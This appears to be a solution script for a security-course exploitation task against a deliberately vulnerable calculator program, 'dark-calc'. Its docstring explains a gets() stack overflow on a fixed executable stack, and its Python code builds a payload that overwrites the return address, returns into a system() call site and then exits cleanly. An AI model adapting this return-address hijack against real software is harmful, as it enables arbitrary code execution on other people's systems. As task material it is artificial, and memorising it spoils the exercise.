#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Goal: make dark-calc execute ./malware ("detonate the bomb").

dark-calc runs main() on a *fixed* mmap'ed, executable stack:
    init_fixed_stack() maps 0x802000 bytes at 0x721000000000 (RWX) and
    sets fixed_stack_top = 0x721000801000.  __wrap_main() switches rsp to
    it, so every stack address is constant even with ASLR enabled.

Stack frame of input():
    expression = rbp - 0x10 = 0x721000800fd0   (gets() destination)
    saved rbp  = rbp        (=0x721000800fe0)
    return adr = rbp + 8    (=0x721000800fe8)

gets() has no length limit, so we overwrite the saved rbp and the return
address.  The payload starts with "./malware": input() still runs
strcpy(command_buf, expression) (0x6030d0) before returning, so the
global command buffer ends up holding exactly the command we want.

Instead of injecting shellcode we return into eval()'s own call site,
    0x401a6b:  mov edi, 0x6030d0
    0x401a70:  call system@plt
which hands system() a correctly aligned stack and a proper return
address.  The saved rbp is set to 0x721000800fe8, so the "leave; ret"
at the end of eval() pivots onto our last qword, exit@plt, and the
process terminates cleanly after ./malware has been executed.

(The stack is executable as well, and a shellcode stub doing
"mov edi,0x6030d0; push system@plt; ret" works too, but system() would
then return onto garbage; the call-site variant is cleaner.)
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

STACK_BASE = 0x721000800FD0      # address of input()'s expression[16]
CALL_SYSTEM = 0x401A6B           # eval(): mov edi, command_buf; call system
EXIT_PLT = 0x401880              # exit@plt

payload = b"./malware\x00"              # strcpy() copies this into command_buf
payload = payload.ljust(16, b"\x90")    # expression[16]
payload += p64(STACK_BASE + 0x18)       # saved rbp -> makes eval's leave;ret exit
payload += p64(CALL_SYSTEM)             # hijacked return address
payload += p64(EXIT_PLT)                # target of eval's final "ret"

sys.stdout.buffer.write(payload + b"\n")
